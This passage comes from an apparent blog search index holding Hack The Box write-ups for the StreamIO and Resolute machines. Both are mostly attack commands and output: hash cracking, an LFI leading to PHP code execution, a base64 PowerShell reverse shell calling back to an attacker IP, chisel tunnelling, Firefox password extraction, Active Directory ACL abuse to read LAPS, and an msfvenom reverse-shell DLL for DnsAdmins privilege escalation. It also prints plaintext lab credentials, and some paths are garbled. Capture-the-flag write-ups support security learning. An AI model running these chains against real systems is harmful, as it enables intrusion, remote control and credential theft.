//g'\nadmin:665a50ac9eaa781e4f7f04199db97a11\nAlexendra:1c2b3d8270321140e5153f6637d3ee53\nasdasd:7815696ecbf1c96e6894b779456d330e\nAustin:0049ac57646627b8d7aeaccf8b6a936f\nBarbra:3961548825e3e21df5646cafe11c6c76\nBarry:54c88b2dbd7b1a84012fabc1a4c73415\nBaxter:22ee218331afd081b0dcd8115284bae3\nBruno:2a4e2cf22dd8fcb45adcb91be1e22ae8\nCarmon:35394484d89fcfdb3c5e447fe749d213\nClara:ef8f3d30a856cf166fb8215aca93e9ff\n:d41d8cd98f00b204e9800998ecf8427e\nDiablo:ec33265e5fc8c2f1b0c137bb7b3632b5\nGarfield:8097cedd612cc37c29db152b6e9edbd3\nGloria:0cfaaaafb559f081df2befbe66686de0\nJames:c660060492d9edcaa8332d89c99c9239\nJuliette:6dcd87740abb64edfa36d170f0d5450d\nLauren:08344b85b329d7efd611b7a7743e8a09\nLenord:ee0b8a0937abd60c2882eacb2f8dc49f\nLucifer:7df45a9e3de3863807c026ba48e55fb3\nmat:43b0494e505be040c691856c67385ec6\nmat:4a258d930b7d3409982d727ddbb4ba88\nmattt:7b8a3544637ef0e8fd2859095876e461\nmca:43b0494e505be040c691856c67385ec6\nmca:7b8a3544637ef0e8fd2859095876e461\nMichelle:b83439b16f844bd6ffe35c02fe21b3c0\noliver:25ed1bcb423b0b7200f485fc5ff71c8e\nOliver:fd78db29173a5cf701bd69027cb9bf6b\nRobert:f03b910e2bd0313a23fdd7575f34a694\nRobin:dc332fb5576e9631c9dae83f194f8e70\nSabrina:f87d3c0d6c8fd686aacc6627f1f493a5\nSamantha:083ffae904143c4796e464dac33c1f7d\nStan:384463526d288edcc95fc3701e523bc7\nThane:3577c47eb1e12c8ba021611e1280753c\nTheodore:925e5408ecb67aea449373d668b7359e\nVictor:bf55e15b119860a6e6b5a164377da719\nVictoria:b22abb47a02b52d5dfa27fb0b534f693\nWilliam:d62be0dc82071bccc1322d64ec5b6c51\nyoshihide:b779ba15cedfd22a023c4d8bcf5f2332\nCrack the hashes with hashcat\n➜  streamio hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt --user\n➜  streamio hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt --user --show\nadmin:665a50ac9eaa781e4f7f04199db97a11:paddpadd\nasdasd:7815696ecbf1c96e6894b779456d330e:asd\nBarry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW\nBruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$\nClara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara\nd41d8cd98f00b204e9800998ecf8427e:\nJuliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch\nLauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##\nLenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i\nmat:4a258d930b7d3409982d727ddbb4ba88:mat\nMichelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123\noliver:25ed1bcb423b0b7200f485fc5ff71c8e:zz\nSabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$\nThane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical\nVictoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!\nyoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..\n\n\n\n### Step 3 Testing all the credentials on https://streamio.htb/login.php we find that only yoshihide:66boysandgirls.. works. As yoshihide we are able to visit https://streamio.htb/admin and can manage users, staff, movies and “leave a message for admin”.\n\n\n\n\n### Step 4 Tinkering around with the LFI I came to think of php://filter, we should be able to extract the code of the known files to see if there are any vulnerable functions that we can exploit.\n\n\n```bash ➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php [… snip …] PGgxPk1..\n\n\n➜ streamio echo “PGgxPk1..” | base64 -d [… snip …]\n\n\n\n\n\n\n\n\n\n\n\nAt the end we find a vulnerable function:\n\n\nWith the eval-function we are able to execute php scripts and system commands. First confirm that we got RCE and then leverage to gain a reverse shell! ```bash ➜ streamio echo “c3lzdGVtKCRfR0VUWydjbWQnXSk7” | base64 -d system($_GET[‘cmd’]);%\n\n\n➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&cmd=dir [… snip …]\n\n\n\n\n\nDirectory of C:.htb\n\n\n02/22/2022 03:49 AM\n\n\nFor the reverse shell I find it to be easiest to use revshells.com and select PowerShell #3 (Base64) and from the advanced options enable URL Encoding. This will most of the times get rid of all syntax/encoding issues. ```bash ➜ streamio curl -k –cookie “PHPSESSID=tale6gpt5rke8jbtvc6rqlhqng” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D\n\n\n➜ streamio rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.3] from (UNKNOWN) [10.10.11.158] 51338\n\n\nPS C:.htb&gt; whoami streamio```\n\n\n### Step 5 Inside the box we start to enumerate local files, and quickly we find some database credentials.\n\n\n```bash PS C:.htb&gt; cat index.php [… snip …] \\(connection = array(\"Database\"=&gt;\"STREAMIO\", \"UID\" =&gt; \"db_admin\", \"PWD\" =&gt; 'B1@hx31234567890');\\)handle = sqlsrv_connect(‘(local)’,$connection);\n\n\n```\n\n\nUsing netstat we find that the database is running on default port 1433: ```powershell PS C:.htb&gt; netstat -aof [… snip …] TCP 0.0.0.0:1433 DC.streamIO.htb:0 LISTENING 3616\n\n\nPS C:.htb&gt; Get-Process -Id 3616 Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName\n\n\n\n856      57   442572     317908              3616   0 sqlservr\n\nTo be able to communicate with the service we need to setup a tunnel, we do this using chisel.\n```bash\n## Setup local listener\n➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server --reverse --port 9001\n\n## Upload chisel to victim (note: SMB transfer will get caught)\nPS C:\\Windows\\Tasks&gt; curl http://10.10.14.3:8080/chisel.exe -o chisel.exe\n\n## Run the client to tunnel port 1433\nPS C:\\Windows\\Tasks&gt; .\\chisel.exe client 10.10.14.3:9001 R:1433:localhost:1433\nEnumerate the database using sqsh:\n➜ streamio sqsh -S 127.0.0.1 -U db_admin -P 'B1@hx31234567890' -D streamio_backup\n1&gt; select @@version\n2&gt; go\n    Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) \n    Sep 24 2019 13:48:23 \n    Copyright (C) 2019 Microsoft Corporation\n    Express Edition (64-bit) on Windows Server 2019 Standard 10.0 &lt;X64&gt; (Build 17763: ) (Hypervisor)\n\n1&gt; select * from users;\n2&gt; go\n id     username       password                                                                                                                                             \n 1      nikk37         389d14cb8e4e9b94b137deb1caf0612a\n 2      yoshihide      b779ba15cedfd22a023c4d8bcf5f2332\n 3      James          c660060492d9edcaa8332d89c99c9239\n 4      Theodore       925e5408ecb67aea449373d668b7359e\n 5      Samantha       083ffae904143c4796e464dac33c1f7d\n 6      Lauren         08344b85b329d7efd611b7a7743e8a09\n 7      William        d62be0dc82071bccc1322d64ec5b6c51\n 8      Sabrina        f87d3c0d6c8fd686aacc6627f1f493a5\nSave the users and it’s hash to a file and start to crack them with hashcat.\n➜  streamio hashcat -a0 -m0 db-users.txt /usr/share/wordlists/rockyou.txt --user\n➜  streamio hashcat -a0 -m0 db-users.txt /usr/share/wordlists/rockyou.txt --user --show\nnikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com\nyoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..\nLauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##\nSabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$\nWe find one new set of credentials - nikk37:get_dem_girls2@yahoo.com. Login with Evil-WinRM and grab that user flag!\n➜  streamio evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.com\n*Evil-WinRM* PS C:\\Users\\nikk37\\Desktop&gt; cat user.txt\n3e11807b2fae875626ee550f08bd5336\n\n\n\n\nROOT\n\nStep 1\nLook on groups, privileges and powershell history.\n## History (none)\n*Evil-WinRM* PS C:\\Users\\nikk37\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; Get-ChildItem -Force\n\n## Groups and Privileges\n*Evil-WinRM* PS C:\\Users&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name       SID\n=============== ==============================================\nstreamio\\nikk37 S-1-5-21-1470860369-1569627196-4264678630-1106\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes\n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\nNothing that’s really out of the ordinary, next check should be Kerberoast and BloodHound.\n➜  streamio bloodhound-python -u nikk37 -p 'get_dem_girls2@yahoo.com' -ns 10.10.11.158 -d streamio.htb -c all\nINFO: Found AD domain: streamio.htb\nINFO: Connecting to LDAP server: dc.streamio.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc.streamio.htb\nINFO: Found 8 users\nINFO: Connecting to GC LDAP server: dc.streamio.htb\nINFO: Found 54 groups\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.streamIO.htb\nINFO: Done in 00M 05S\nRunning the raw query MATCH (u:User {hasspn:true}) RETURN u in Bloodhound we find all users that are Kerberoastable - unfortunatley we only find krbtgt which is default. Analyzing further with BloodHound we can’t find anything of use from nikk37. However searching from the domain (STREAMIO.HTB) and selecting “Shortest Path to Here” we find two interesting users - Martin and JDGODD.\n\n\n\nStep 2\nEnumerating the box localy we find that Mozilla Firefox is installed. With the box Hancliffe relatively fresh in mind, firefox profiles is something that we love to find.\n*Evil-WinRM* PS C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release&gt; ls\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        2/22/2022   2:41 AM         229376 cert9.db\n-a----        2/22/2022   2:40 AM          98304 cookies.sqlite\n-a----        2/22/2022   2:40 AM         294912 key4.db\n-a----        2/22/2022   2:41 AM           2081 logins.json\nAll four files that we need to extract credentials are there. Download them to your local machine, setup a tree structure like the victim and use firefox_decrypt to extract loot.\n*Evil-WinRM* PS C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release&gt; download C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\cert9.db\n                                                             \nInfo: Download successful!\n➜  streamio tree\n.\n├── firefox-loot\n│   └── br53rxeg.default-release\n│       ├── cert9.db\n│       ├── cookies.sqlite\n│       ├── key4.db\n│       └── logins.json\n\n➜  firefox_decrypt git:(master) ✗ ./firefox_decrypt.py /htb/streamio/firefox-loot/br53rxeg.default-release \n2022-08-02 16:23:13,335 - WARNING - profile.ini not found in /htb/streamio/firefox-loot/br53rxeg.default-release\n2022-08-02 16:23:13,335 - WARNING - Continuing and assuming '/htb/streamio/firefox-loot/br53rxeg.default-release' is a profile location\n\nWebsite:   https://slack.streamio.htb\nUsername: 'admin'\nPassword: 'JDg0dd1s@d0p3cr3@t0r'\n\nWebsite:   https://slack.streamio.htb\nUsername: 'nikk37'\nPassword: 'n1kk1sd0p3t00:)'\n\nWebsite:   https://slack.streamio.htb\nUsername: 'yoshihide'\nPassword: 'paddpadd@12'\n\nWebsite:   https://slack.streamio.htb\nUsername: 'JDgodd'\nPassword: 'password@12'\nNone of the found credentials / passwords work over WinRM with neither Martin, JDGODD or Administrator.. Nor are we allowed to execute commands remotely using script blocks:\n*Evil-WinRM* PS C:\\Users&gt; $user = 'JDgodd'\n*Evil-WinRM* PS C:\\Users&gt; $pass = 'JDg0dd1s@d0p3cr3@t0r' | ConvertTo-SecureString -AsPlainText -Force\n*Evil-WinRM* PS C:\\Users&gt; $creds = New-Object System.Management.Automation.PSCredential($user,$pass)\n*Evil-WinRM* PS C:\\Users&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }\nConnecting to remote server localhost failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.\n\n    + CategoryInfo          : OpenError: (localhost:String) [], PSRemotingTransportException\n    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken\nInstead of trial and error with username/password combination like above, we can use crackmapexec to confirm that the creds jdgodd:JDg0dd1s@d0p3cr3@t0r work. However we need to find a way to use them.\n➜ streamio crackmapexec smb 10.10.11.158 -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\"\nSMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.158    445    DC               [+] streamIO.htb\\jdgodd:JDg0dd1s@d0p3cr3@t0r \n\n\nStep 3\nIn BloodHound we saw that JDGODD had WriteOwner rights to the group CORE STAFF@STREAMIO.HTB. Looking on the ACL attack graph, below, we need to change the rights to WriteDACL and then GenericAll. With GenericAll we are allowed to add members to a group, and in this case we saw earlier that CORE STAFF group is allowed to read LAPS password - meaning Administrator access.\n\n\n## Get WriteDACL\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio.htb -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 setOwner JDGODD \"CORE STAFF\"\n[*] JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104\n[+] Old owner S-1-5-21-1470860369-1569627196-4264678630-1104 is now replaced by JDGODD on CORE STAFF\n\n## GenericAll\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio.htb -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 setGenericAll JDGODD \"CORE STAFF\"\n[*] JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104\n[+] JDGODD can now write the attributes of CORE STAFF\n\n## Add JDGODD to Core Staff group\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio.htb -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 getObjectAttributes  \"CORE STAFF\" member\n{\n    \"member\": []\n}\n\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio.htb -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 addObjectToGroup JDGODD \"CORE STAFF\"\n[*] JDGODD found at CN=JDgodd,CN=Users,DC=streamIO,DC=htb\n[*] CORE STAFF found at CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb\n[+] CN=JDgodd,CN=Users,DC=streamIO,DC=htb added to CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb\n\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio.htb -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 getObjectAttributes  \"CORE STAFF\" member\n{\n    \"member\": [\n        \"CN=JDgodd,CN=Users,DC=streamIO,DC=htb\"\n    ]\n}\n\n## Read LAPS Password\n➜  bloodyAD git:(main) ./bloodyAD.py -d streamio -u jdgodd -p \"JDg0dd1s@d0p3cr3@t0r\" --host 10.10.11.158 getObjectAttributes dc$ ms-mcs-admpwd \n{\n    \"ms-Mcs-AdmPwd\": \"#J$FRGC-6446b3\"\n}\nLogin as Administrator and grab root.txt.\n➜  streamio evil-winrm -i 10.10.11.158 -u Administrator -p '#J$FRGC-6446b3'\n*Evil-WinRM* PS C:\\Users\\Martin\\Desktop&gt; cat root.txt\n8e096689d3272326aa70edf422e01127\n\n\n\n\nReferenses\nMsSQL SELECT: https://docs.microsoft.com/en-us/sql/t-sql/queries/select-examples-transact-sql?view=sql-server-ver16\nMsSQL Concat: https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-concat_ws-function/#:~:text=The%20SQL%20Server%20CONCAT_WS()%20function%20concatenates%20two%20or%20more,()%20means%20concatenate%20with%20separator.&text=In%20this%20syntax%3A,NCHAR%20%2C%20VARCHAR%20%2C%20or%20NVARCHAR%20."
  },
  {
    "objectID": "posts/2019-12-13-htb-writeup-resolute/2019-12-13-htb-writeup-resolute.html",
    "href": "posts/2019-12-13-htb-writeup-resolute/2019-12-13-htb-writeup-resolute.html",
    "title": "Resolute - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/resolute# nmapAutomatorDirb.sh 10.10.10.169 All PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open adws 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open winrm 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49909/tcp open msrpc Microsoft Windows RPC 49926/tcp open unknown\nPORT STATE SERVICE 53/udp open domain? | fingerprint-strings: | DNS-SD: | _services | _dns-sd | udp | local | sybaseanywhere: | CONNECTIONLESS_TDS 123/udp open ntp NTP v3 389/udp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\nDOMAIN: megabank.local\nEnum domain users with rpcclient root@p3:/opt/htb/machines/resolute# rpcclient -U “” resolute.htb Enter WORKGROUP's password: rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778]\nUsing queryuser, only Administrator has a logon_count higher then 0. However we find credentials in the description for user Marko Novak (marko:Welcome123!)\nrpcclient $&gt; queryuser 0x457 User Name : marko Full Name : Marko Novak Description : Account created. Password set to Welcome123!\nUsing evil-winrm we are unable to login with the found credentials. Maybe there’s another user with the same password. Enumerate this using msf module scanner/winrm/winrm_login and user-list of all found users.\nmsf5 auxiliary(scanner/winrm/winrm_login) &gt; run [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local:Welcome123! (Incorrect: ) .. [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local:Welcome123! (Incorrect: ) [+] 10.10.10.169:5985 - Login Successful: megabank.local:Welcome123! [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local:Welcome123! (Incorrect: ) –\nWe got a match! User melanie has the password Welcome123!\nLogin as melanie with evil-winrm and grab user.txt\nroot@p3:/opt/htb/machines/resolute# evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!\nEvil-WinRM PS C:&gt; whoami megabank Evil-WinRM PS C:&gt; cat user.txt 0c3b****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating within the box we find following dirs under C:, however we don’t have access to any of them. Evil-WinRM PS C:&gt; dir Directory: C: Mode LastWriteTime Length Name —- ————- —— —- d—– 9/25/2019 10:43 AM Administrator d—– 12/4/2019 2:46 AM melanie d-r— 11/20/2016 6:39 PM Public d—– 9/27/2019 7:05 AM ryan\nUnder C: we find a hidden directories PSTranscripts\\20191203 and within a .txt-file containing user ryan’s credentials. Evil-WinRM PS C:\\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt ********************** Command start time: 20191203063515 ********************** PS&gt;CommandInvocation(Invoke-Expression): “Invoke-Expression” &gt;&gt; ParameterBinding(Invoke-Expression): name=“Command”; value=“cmd /c net use X: \\fs01ryan Serv3r4Admin4cc123!\nif (!\\(?) { if(\\)LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }” &gt;&gt; CommandInvocation(Out-String): “Out-String” &gt;&gt; ParameterBinding(Out-String): name=“Stream”; value=“True” ********************** Windows PowerShell transcript start Start time: 20191203063515 Username: MEGABANK RunAs User: MEGABANK Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0) Host Application: C:.exe -Embedding Process ID: 2800 PSVersion: 5.1.14393.2273 PSEdition: Desktop PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273 BuildVersion: 10.0.14393.2273 CLRVersion: 4.0.30319.42000 WSManStackVersion: 3.0 PSRemotingProtocolVersion: 2.3 SerializationVersion: 1.1.0.1 ********************** ********************** Command start time: 20191203063515 ********************** PS&gt;CommandInvocation(Out-String): “Out-String” &gt;&gt; ParameterBinding(Out-String): name=“InputObject”; value=“The syntax of this command is:” cmd : The syntax of this command is: At line:1 char:1\n\ncmd /c net use X: \\fs01ryan Serv3r4Admin4cc123!\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nCategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException\nFullyQualifiedErrorId : NativeCommandError cmd : The syntax of this command is: At line:1 char:1\ncmd /c net use X: \\fs01ryan Serv3r4Admin4cc123!\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nCategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException\nFullyQualifiedErrorId : NativeCommandError ********************** Windows PowerShell transcript start Start time: 20191203063515 Username: MEGABANK RunAs User: MEGABANK Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0) Host Application: C:.exe -Embedding Process ID: 2800 PSVersion: 5.1.14393.2273 PSEdition: Desktop PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273 BuildVersion: 10.0.14393.2273 CLRVersion: 4.0.30319.42000 WSManStackVersion: 3.0 PSRemotingProtocolVersion: 2.3 SerializationVersion: 1.1.0.1 **********************\n\nNOTE: Creds - ryan:Serv3r4Admin4cc123!\nLogin in as ryan and looking on his group membership we find that he’s a part of DnsAdmins. Reading about this group there are a “feature” that allows privesc from DnsAdmin to Domain Admin - using malicious dll’s. Evil-WinRM PS C:&gt; whoami /all USER INFORMATION —————-\nUser Name SID ============= ============================================== megabankS-1-5-21-1392959593-3013219662-3596683436-1105\nGROUP INFORMATION —————–\nGroup Name Type SID Attributes ========================================== ================ ============================================== =============================================================== .. MEGABANKGroup S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group MEGABANKAlias S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group ..\nConfirm the architecture and then create your .dll using msfvenom. Evil-WinRM PS C:&gt; $env:PROCESSOR_ARCHITECTURE AMD64\nroot@p3:/opt/htb/machines/resolute# msfvenom –platform=windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4400 -f dll -o plugin.dll No encoder or badchars specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 5120 bytes root@p3:/opt/htb/machines/resolute# cp privesc64.dll /srv/pub-share/ root@p3:/opt/htb/machines/resolute# chmod 777 /srv/pub-share/privesc64.dll\nNOTE: You NEED high privs on the .dll-file else it wont work.\nSetup a local listener, load the dll on the victim, and restart the dns service. Evil-WinRM PS C:&gt; dnscmd.exe \\Resolute /Config /serverlevelplugindll \\10.10.14.3-share64.dll Registry property serverlevelplugindll successfully reset. Command completed successfully.\nEvil-WinRM PS C:&gt; sc.exe \\Resolute stop dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) 